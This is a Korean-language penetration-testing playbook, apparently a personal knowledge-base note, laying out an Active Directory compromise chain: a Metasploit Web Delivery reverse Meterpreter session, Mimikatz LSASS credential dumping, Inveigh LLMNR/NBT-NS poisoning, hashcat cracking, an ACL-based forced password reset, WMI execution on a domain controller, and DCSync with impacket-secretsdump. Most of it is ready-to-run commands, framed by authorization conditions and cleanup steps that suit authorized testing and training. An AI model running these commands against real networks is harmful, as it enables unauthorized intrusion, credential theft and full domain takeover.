---
tags:
  - 환경/windows
  - 환경/ad
  - 서비스/smb
  - 기능/권한상승
시작상태:
  - 도메인에 연결된 Windows 호스트에서 SYSTEM 명령 실행 가능
  - Linux 공격 호스트에서 대상 호스트의 reverse 연결 수신 가능
목표:
  - Windows 호스트의 재사용 가능한 AD 자격 증명 확보
  - LLMNR 또는 NBT-NS 인증에서 NetNTLMv2 hash 수집과 비밀번호 복구
  - 대상 AD 사용자 객체의 비밀번호 재설정과 관리자 자격 증명 확보
  - Domain Controller 원격 명령 실행과 DCSync
필요권한:
  - Windows 시작 호스트의 NT AUTHORITY\SYSTEM
  - LSASS 메모리 또는 LSA secret 읽기 권한
  - 대상 AD 사용자 객체의 비밀번호 재설정 권한
  - DCSync에 필요한 복제 권한
필요정보:
  - 도메인·DC와 다음 Windows 호스트
  - 공격 호스트 listener 주소와 포트
  - 제어 중인 AD 계정과 ACL 대상 객체
네트워크위치:
  - Linux 공격 호스트에서 시작 Windows 호스트와 도메인 내부 호스트에 직접 또는 피벗 경유 접근
---

# Linux에서 Windows Meterpreter를 사용한 AD 사용자 비밀번호 재설정과 DCSync

## 시나리오 개요

Windows 호스트의 SYSTEM 명령 실행에서 Meterpreter 세션을 열고 LSASS 또는 LSA secret에서 AD 자격 증명을 확보한다. 먼저 이 자료의 서비스별 로그온 권한·AD 객체 제어권·복제 권한을 재평가한다. 추가 계정이 필요하고 같은 링크에서 이름 해석 요청을 관찰할 수 있을 때만 Inveigh와 오프라인 크래킹을 선택하며, 비밀번호 재설정은 목표 접근을 실제로 넓히고 영향·복구가 승인된 사용자 객체에만 수행한다.
이후 원격 실행은 새 자격 증명에 대상 서비스의 로그온 권한이 있을 때만, DCSync는 같은 주체의 디렉터리 복제 권한을 별도로 확인한 경우에만 선택한다. 두 조건이 충족되지 않으면 해당 단계에서 멈추고 상태 라우터를 다시 선택한다.

## 기준 구조

```text
Linux 공격 호스트
  <- reverse Meterpreter
Windows 시작 호스트 SYSTEM
  -> LSASS 또는 LSA secret에서 AD 자격 증명
    -> 서비스 접근·AD 객체 제어·복제 권한 재평가
      -> (조건부) 같은 링크 요청 관찰 시 Inveigh와 크래킹
        -> (조건부) 승인된 대상 사용자 비밀번호 재설정
          -> (조건부) 검증된 원격 로그온 경로
            -> (조건부) 복제 권한 확인 후 DCSync <DCSYNC_ACCOUNT>
```

## 시작 상태

| 확인할 것 | 필요한 상태 | 확인 방법 | 미충족 시 다음 확인 |
|---|---|---|---|
| 시작 호스트 권한 | SYSTEM 명령 실행 | `hostname & whoami` | [[PrintSpoofer로 SeImpersonatePrivilege 권한 상승]] 등 실제 고권한 확인 |
| reverse 경로 | 시작 호스트에서 handler 포트 연결 | 실제 세션 생성 | LHOST·LPORT·route·방화벽 확인 |
| 도메인 경로 | Windows 호스트에서 DC DNS·LDAP·Kerberos 접근 | `nltest`, `Test-NetConnection` | [[AD 도메인 컨텍스트 기본 확인]] |
| 다음 호스트 접근 | 확보할 계정으로 RDP 또는 다른 원격 로그온 가능 | 서비스별 인증 | [[확보한 자격 증명으로 원격 접근 경로 선택]] |
| AD 객체 제어권 | 현재 AD 계정이 사용자 또는 그룹 객체에 필요한 쓰기 권한 보유 | BloodHound와 ACL 재조회 | [[AD 객체 제어권 확보 후 악용 경로 선택]] |

## 공격 경로 요약

| 단계 | 실행 위치 | 수행할 행동 | 확인할 출력·상태 | 다음 단계 |
|---|---|---|---|---|
| 1 | Metasploit와 Windows SYSTEM 명령 채널 | [[Metasploit Web Delivery로 Meterpreter 세션 획득]] | SYSTEM Meterpreter 세션 | 도구 반입 |
| 2 | Meterpreter | [[Meterpreter upload로 Windows 파일 반입]] | 원격 Mimikatz 파일과 hash | LSASS 수집 |
| 3 | Windows SYSTEM 세션 또는 Linux 공격 호스트 | [[LSASS 메모리 덤프]] 또는 [[Windows LSA Secrets 추출]] | 계정명이 연결된 평문 비밀번호·NT hash | 서비스별 로그온·AD 객체·복제 권한 재평가 |
| 4 | Linux 공격 호스트 또는 Windows 사용자 세션 | 추가 계정이 필요하고 같은 링크 요청을 관찰할 때만 [[LLMNR NBT-NS 포이즈닝으로 NTLM 인증 수집]]과 [[오프라인 해시 크래킹]] | 사용자명과 NetNTLMv2 hash·검증된 평문 | 대상 사용자 제어권 확인 |
| 5 | Windows 도메인 세션 | [[AD ACL 권한 열거와 공격 경로 식별]] | 대상 사용자 객체의 비밀번호 재설정 권한 또는 복제 권한 | 승인된 변경 또는 DCSync 분기 선택 |
| 6 | Windows 도메인 세션 | 필요한 경우만 [[AD 사용자 비밀번호 강제 재설정]] | 새 비밀번호로 인증 성공 | 검증된 서비스 로그온 경로만 선택 |
| 7 | Linux 공격 호스트 | 원격 로그온 권한이 있을 때만 [[WMI 원격 명령 실행]] | 대상의 원격 명령 출력과 실제 계정 | 복제 권한이 있을 때만 DCSync |
| 8 | Linux 공격 호스트 | 두 복제 권한을 확인한 경우만 [[DCSync]] | `<DCSYNC_ACCOUNT>` NT hash·Kerberos key | 결과 확인 후 복구 |

## 1. SYSTEM 컨텍스트에서 Meterpreter 세션 획득

Linux 공격 호스트의 Metasploit에서 Web Delivery와 x64 Meterpreter reverse handler를 준비한다.

```text
msf6 > jobs -l
msf6 > sessions -l
msf6 > use exploit/multi/script/web_delivery
msf6 exploit(multi/script/web_delivery) > set target 2
msf6 exploit(multi/script/web_delivery) > set payload windows/x64/meterpreter/reverse_tcp
msf6 exploit(multi/script/web_delivery) > set LHOST <ATTACK_INTERFACE_OR_IP>
msf6 exploit(multi/script/web_delivery) > set LPORT 4444
msf6 exploit(multi/script/web_delivery) > set SRVHOST 0.0.0.0
msf6 exploit(multi/script/web_delivery) > run
```

작업 전 job·session 목록과 `run` 뒤 새로 생긴 `<WEB_DELIVERY_JOB_ID>`, `<HANDLER_JOB_ID>`를 기록한다. 기존 job이나 session을 이번 작업의 자원으로 취급하지 않는다.

SYSTEM 명령 실행 채널에서 Metasploit이 출력한 PowerShell launcher를 그대로 실행한다. PrintSpoofer 경유라면 출력된 launcher 전체를 `-c` 인수로 전달한다.

```text
msf6 > sessions -l
msf6 > sessions -i <SESSION_ID>
meterpreter > getuid
meterpreter > sysinfo
```

`sessions -l`에서 실제 생성된 `<SESSION_ID>`를 확인해 선택하고, `Meterpreter session ... opened`와 `Server username: NT AUTHORITY\SYSTEM`을 확인한다.

## 2. Mimikatz 반입과 LSASS 자격 증명 확인
### Linux 공격 호스트와 Windows Meterpreter 명령 전환

`msf6 >` 프롬프트는 Linux 공격 호스트의 Metasploit 콘솔이다. `meterpreter >` 명령은 연결된 Windows 대상에서 실행되고, `lcd`만 Linux 공격 호스트의 로컬 디렉터리를 바꾼다. `upload`는 Linux의 현재 로컬 디렉터리에서 Windows 대상으로 파일을 전송한다.

```text
# Linux 공격 호스트의 msfconsole
msf6 > sessions -i <SESSION_ID>

# Windows 대상의 Meterpreter
meterpreter > pwd
meterpreter > lcd /usr/share/windows-resources/mimikatz/x64
meterpreter > shell

# Windows 대상의 cmd.exe
C:\Windows\Temp> whoami
C:\Windows\Temp> if exist "<REMOTE_MIMIKATZ_PATH>" (echo EXISTS) else (echo ABSENT)
C:\Windows\Temp> exit

# Windows 대상의 Meterpreter
meterpreter > upload mimikatz.exe <REMOTE_MIMIKATZ_PATH>
meterpreter > ls <REMOTE_MIMIKATZ_PATH>
meterpreter > shell

# Windows 대상의 cmd.exe
C:\Windows\Temp> certutil.exe -hashfile "<REMOTE_MIMIKATZ_PATH>" SHA256
C:\Windows\Temp> exit

# Windows 대상의 Meterpreter
meterpreter > background

# Linux 공격 호스트의 msfconsole
msf6 > sessions -l
```

`shell` 뒤 `exit`는 Windows `cmd.exe`를 닫고 Meterpreter로 돌아간다. `background`는 세션을 끊지 않고 Linux의 `msfconsole` 프롬프트로 돌아간다.

`ABSENT`가 확인된 고유한 `<REMOTE_MIMIKATZ_PATH>`만 사용하고, `upload` 뒤 `ls`의 원격 크기와 `certutil`의 SHA-256을 공격 호스트 원본과 대조한다.

```text
C:\> <REMOTE_MIMIKATZ_PATH>
mimikatz # privilege::debug
mimikatz # sekurlsa::logonpasswords
```

`Privilege '20' OK`는 debug privilege 활성화, `Authentication Id`별 `Username`, `Domain`, `NTLM`, `Password`는 로그온 세션별 결과다. `(null)` 값과 실제 평문 비밀번호·NT hash를 구분한다.

원격 로컬 관리자 자격 증명을 이미 가지고 있다면 [[Windows LSA Secrets 추출]]의 NetExec 경로로 대체할 수 있다. 이 시나리오에서는 어느 경로를 사용하든 계정명이 연결된 평문 비밀번호 또는 재사용 가능한 NT hash를 확보한 상태에서 다음 단계로 간다.

`Dumping LSA Secrets` 뒤 `DOMAIN\user:password` 형태가 나오면 AutoLogon 등 계정명이 연결된 평문 secret이다. `$DCC2$`와 머신 계정 `plain_password_hex`는 같은 결과가 아니다.

## 3. 확보한 AD 자격 증명으로 다음 Windows 호스트 로그인

```bash
xfreerdp /v:<RDP_TARGET> /d:<DOMAIN> /u:<AD_USER> /dynamic-resolution /cert:ignore
```

비밀번호는 FreeRDP 프롬프트에 입력한다. GUI 세션이 열리면 `whoami`, `hostname`과 현재 그룹을 확인한다. RDP 로그인 성공은 로컬 관리자나 AD 객체 제어권을 뜻하지 않는다.

## 4. Inveigh로 NetNTLMv2 인증 수집
추가 계정이 필요하고 같은 링크에서 LLMNR 또는 NBT-NS 요청을 관찰할 수 있을 때만 수행한다. 요청 관찰이 없는 환경에서는 이 단계를 강행하지 않고, 이미 확보한 자격 증명의 서비스별 접근과 AD 객체 권한을 다시 평가한다.

```powershell
Test-Path -LiteralPath '<INVEIGH_OUTPUT_DIRECTORY>'
New-Item -ItemType Directory -Path '<INVEIGH_OUTPUT_DIRECTORY>'
Import-Module .\Inveigh.ps1
Invoke-Inveigh -LLMNR Y -NBNS Y -ConsoleOutput Y -FileOutput Y -FileOutputDirectory '<INVEIGH_OUTPUT_DIRECTORY>'
```

`Test-Path`가 `False`인 고유 디렉터리를 사용한다. 사용자명, 도메인, 출발지 IP와 `NTLMv2` challenge-response를 함께 기록한다. 요청이 없으면 같은 링크·이름 해석 프로토콜·방화벽·수신 인터페이스를 확인한다.

## 5. NetNTLMv2 hash 오프라인 크래킹

```bash
hashcat -m 5600 <NETNTLMV2_HASH_FILE> <WORDLIST> --backend-ignore-opencl -d 1 -O -w 3
```

복구된 평문은 해당 hash에 표시된 사용자 계정의 비밀번호 후보이다. 새 서비스 인증으로 유효성과 계정 범위를 확인한다.

## 6. 대상 AD 사용자 객체의 비밀번호 재설정 권한 확인
이 변경은 `<TARGET_AD_USER>`의 새 자격 증명이 목표 접근을 실제로 넓히고, 변경 영향·복구가 승인된 경우에만 선택한다. 복제 권한을 이미 확인했다면 비밀번호 변경 없이 DCSync 분기로 진행한다.

BloodHound의 edge에서 주체와 대상 객체 유형을 확인한 뒤 PowerView로 대상 사용자 객체의 ACL을 재조회한다. 이 경로의 대상은 `<TARGET_AD_USER>` 계정이다.

```powershell
Import-Module .\PowerView.ps1
$sid = Convert-NameToSid $env:USERNAME
Get-DomainObjectAcl -Identity <TARGET_AD_USER> -ResolveGUIDs |
  Where-Object {
    $_.SecurityIdentifier -eq $sid -and
    $_.ObjectAceType -eq 'User-Force-Change-Password'
  } |
  Select-Object ObjectDN,ActiveDirectoryRights,ObjectAceType,SecurityIdentifier
```

`ObjectDN`이 `<TARGET_AD_USER>` **사용자 객체**이고 `ObjectAceType`이 `User-Force-Change-Password`여야 이 비밀번호 변경 경로를 사용한다. 그룹 객체의 `GenericAll`은 이 명령의 근거가 아니다.

## 7. 도메인 <TARGET_AD_USER> 비밀번호 변경

```cmd
net user <TARGET_AD_USER> * /domain
```

새 비밀번호를 두 번 입력한다. `*`를 사용하면 비밀번호를 명령줄과 shell history에 직접 남기지 않는다. `The command completed successfully.`가 출력되면 새 <TARGET_AD_USER> 자격 증명으로 다음 단계의 원격 인증을 시도한다.

## 8. 새 <TARGET_AD_USER> 자격 증명으로 DC WMI 명령 실행
새 자격 증명에 DC WMI 로그온 권한과 네트워크 경로가 검증된 경우에만 수행한다. 다른 서비스 접근만 가능하면 해당 서비스의 상태 라우터를 선택한다.

```bash
impacket-wmiexec '<DOMAIN>/<TARGET_AD_USER>@<DC_IP>'
```

```cmd
C:\> hostname
C:\> whoami
```

비밀번호 프롬프트에 7단계에서 설정한 값을 입력한다. WMI 셸이 열리고 `hostname`, `whoami`가 DC의 예상 결과를 반환해야 한다.

## 9. DCSync로 <DCSYNC_ACCOUNT> 자격 증명 확인
먼저 [[AD 계정의 디렉터리 복제 권한 확인]]에서 `<TARGET_AD_USER>`의 사용자 SID와 유효 그룹 SID 집합에 두 필수 복제 권한이 적용되고 적용 deny가 없는지 확인한다. 원격 WMI 실행이나 대상 사용자 비밀번호 변경만으로 DCSync 권한이 생기지 않는다.

```bash
impacket-secretsdump '<DOMAIN>/<TARGET_AD_USER>@<DC_IP>' -just-dc-user <DCSYNC_ACCOUNT>
```

비밀번호 프롬프트에 같은 값을 입력한다. `Dumping Domain Credentials` 뒤 `DOMAIN\<DCSYNC_ACCOUNT>:RID:LM_HASH:NT_HASH:::` 형식이 출력되어야 한다. 445/TCP 연결 실패는 인증·복제 권한 전에 네트워크 경로부터 확인한다.

## 실패 시 분기

| 실패 지점·출력 | 먼저 확인할 것 | 다음 경로 |
|---|---|---|
| Meterpreter session 없음 | launcher 실행, handler bind·LHOST·LPORT | [[Metasploit Web Delivery로 Meterpreter 세션 획득]] |
| `sekurlsa::logonpasswords` access denied | SYSTEM·debug privilege, PPL·EDR | [[LSASS 메모리 덤프]] |
| RDP 로그인 거부 | 비밀번호 유효성, RDP 로그온 권한·NLA | [[확보한 자격 증명으로 원격 접근 경로 선택]] |
| Inveigh hash 없음 | 동일 링크, LLMNR·NBT-NS 요청, listener interface | [[LLMNR NBT-NS 포이즈닝으로 NTLM 인증 수집]] |
| Hashcat 미복구 | mode 5600, hash 형식, wordlist·rule | [[오프라인 해시 크래킹]] |
| `net user` access denied | ACL 대상이 실제 사용자 객체인지, `User-Force-Change-Password` 권한이 있는지 | [[AD ACL 권한 열거와 공격 경로 식별]] |
| 새 <TARGET_AD_USER> 자격 증명으로 WMI 거부 | 비밀번호 변경 성공 여부, 도메인 표기, DC 주소, WMI·SMB 경로 | [[WMI 원격 명령 실행]] |
| WMI 거부 | 새 로그온 계정의 유효성, 도메인 표기, DC 주소, WMI·SMB 경로 | [[WMI 원격 명령 실행]] |
| DCSync access denied | 요청자의 사용자·유효 그룹 SID에 적용되는 두 복제 권한과 deny, DC 경로·대상 도메인 | [[AD 계정의 디렉터리 복제 권한 확인]] |

## 변경 영향과 복구

복구는 원격 접근이 살아 있는 동안 대상 측 변경을 먼저 처리하고, 마지막에 공격 호스트의 Meterpreter session과 Metasploit job을 닫는다. 특정 단계가 실행되지 않았다면 그 단계의 자원을 만들거나 삭제하지 않는다.

### 1. 새 원격 셸을 닫고 AD 비밀번호 상태 처리

`impacket-wmiexec` 셸에서 `exit`해 새 명령 실행을 끝낸다. 비밀번호를 변경했다면 `<TARGET_AD_USER>` 재설정 권한을 가진 기존 도메인 세션이 살아 있을 때 [[AD 사용자 비밀번호 강제 재설정]]의 복구 절차를 먼저 수행한다.

- 원래 비밀번호를 알고 정책상 재사용할 수 있으면 복원 요청 성공과 승인된 서비스 인증을 별도로 확인한다.
- 원래 비밀번호를 모르면 계정 소유자·관리자의 새 비밀번호 설정과 종속 서비스 갱신이 끝날 때까지 `관리자 복구 인계`다. 기존 세션·ticket, `pwdLastSet`과 감사 기록이 남으므로 원상복구 완료로 기록하지 않는다.
- DCSync는 대상 AD 객체를 변경하지 않는다. 다만 화면 또는 별도 파일에 남은 hash·Kerberos key는 승인된 증적 보존·폐기 정책에 따라 처리하고 Vault에 저장하지 않는다.

3단계에서 원격 [[Windows LSA Secrets 추출]] 경로를 선택했다면 그 대상에 대한 SMB·피벗 경로가 살아 있을 때 Remote Registry의 실행·시작 유형과 `ADMIN$\Temp` 임시 hive를 먼저 기준선과 대조한다. 이 확인을 끝내기 전에 WMI·Meterpreter·피벗 session을 닫지 않으며, 연결이 이미 끊겼으면 LSA secret 확보 성공과 별개로 `원격 복구 미확인`으로 남긴다.

### 2. Inveigh를 중지하고 출력 처분 확인

Inveigh를 실행한 Windows PowerShell에서 listener를 먼저 중지하고, 작업 전 기록한 포트 상태와 비교한다.

```powershell
Stop-Inveigh
Get-NetTCPConnection -State Listen | Where-Object LocalPort -in 80,443,445 | Select-Object LocalAddress,LocalPort,OwningProcess
Get-ChildItem -LiteralPath '<INVEIGH_OUTPUT_DIRECTORY>' -File | Select-Object FullName,Length,LastWriteTime
```

수집 파일은 hash cracking이나 승인된 증적으로 필요한 정확한 경로만 Vault 밖에서 보존하고, 불필요해진 exact 파일은 `Remove-Item -LiteralPath '<INVEIGH_OUTPUT_FILE>'`로 처리한다. 디렉터리가 비었을 때만 `Remove-Item -LiteralPath '<INVEIGH_OUTPUT_DIRECTORY>'`로 제거한다. listener가 닫혔는지 확인할 수 없거나 출력 파일 처분이 끝나지 않았으면 이 항목은 미완료다.

### 3. 대상 파일을 지운 뒤 Meterpreter 세션 종료

Meterpreter session이 살아 있을 때 작업 전 없었던 `<REMOTE_MIMIKATZ_PATH>`만 제거한다. LSASS를 dump 파일 방식으로 수집했다면 [[LSASS 메모리 덤프]]의 exact 원격·로컬 경로 처리도 먼저 끝낸다.

```text
msf6 > sessions -i <SESSION_ID>
meterpreter > rm <REMOTE_MIMIKATZ_PATH>
meterpreter > ls <REMOTE_MIMIKATZ_PATH>
meterpreter > background
msf6 > sessions -k <SESSION_ID>
msf6 > sessions -l
```

원격 파일이 없고 정확한 `<SESSION_ID>`가 목록에서 사라져야 한다. RDP session을 새로 만들었다면 그 session 안에서 로그오프하거나 `query user`로 기록한 exact `<RDP_SESSION_ID>`만 `logoff <RDP_SESSION_ID>`하고, 단순 창 닫기로 disconnected session을 남기지 않는다.

### 4. 공격 호스트 listener job 종료

대상 측 정리를 끝낸 뒤 Linux 공격 호스트의 Metasploit에서 이번 실행으로 추가된 job만 종료한다.

```text
msf6 > jobs -l
msf6 > jobs -k <WEB_DELIVERY_JOB_ID>
msf6 > jobs -k <HANDLER_JOB_ID>
msf6 > jobs -l
```

설치 버전에서 Web Delivery와 handler가 하나의 job으로 표시되면 기록된 그 ID만 한 번 종료한다. 기존 job은 종료하지 않는다. 대상 연결이 먼저 끊겼다면 원격 파일·Inveigh·비밀번호 상태를 확인할 수 없으므로 공격 호스트 job을 닫더라도 전체 복구 완료로 기록하지 않는다.

## 완료 기준

### 공격 목표

- LSASS·LSA 결과에서 확보한 자격 증명의 서비스별 로그온·AD 객체·복제 권한을 구분했다.
- 필요한 조건이 있을 때만 NetNTLMv2 수집·크래킹과 승인된 사용자 비밀번호 재설정을 수행했다.
- 검증된 원격 로그온과 복제 권한이 모두 있을 때만 `<DCSYNC_ACCOUNT>` DCSync 출력을 확인했다.

### 복구 상태

- `완료`: 비밀번호 변경 분기를 사용하지 않았고, 생성한 exact Mimikatz·dump 파일, 선택한 원격 LSA 추출의 임시 hive·Remote Registry, Inveigh listener·출력 처분, WMI·RDP·Meterpreter session과 Metasploit job을 각각 기준선과 대조했다.
- `제한적`: 비밀번호를 한 번이라도 변경했거나 이미 발생한 인증·감사·ticket 영향 또는 보존 중인 민감 출력이 있으며 담당자·보존 위치·후속 조치가 확인됐다. 원래 평문으로 다시 설정했더라도 `pwdLastSet`, 비밀번호 이력, 기존 세션·ticket과 감사 기록은 되돌릴 수 없으므로 `완료`로 올리지 않는다.
- `미확인`: 원격 연결이 먼저 끊겨 대상 파일·listener·계정 상태 중 하나라도 확인하지 못했다. 공격 목표를 달성했더라도 복구 완료로 쓰지 않는다.

## 관련 도구

- [[metasploit]]
- [[meterpreter]]
- [[mimikatz]]
- [[Inveigh]]
- [[hashcat]]
- [[xfreerdp]]
- [[impacket-wmiexec]]
- [[impacket-secretsdump]]
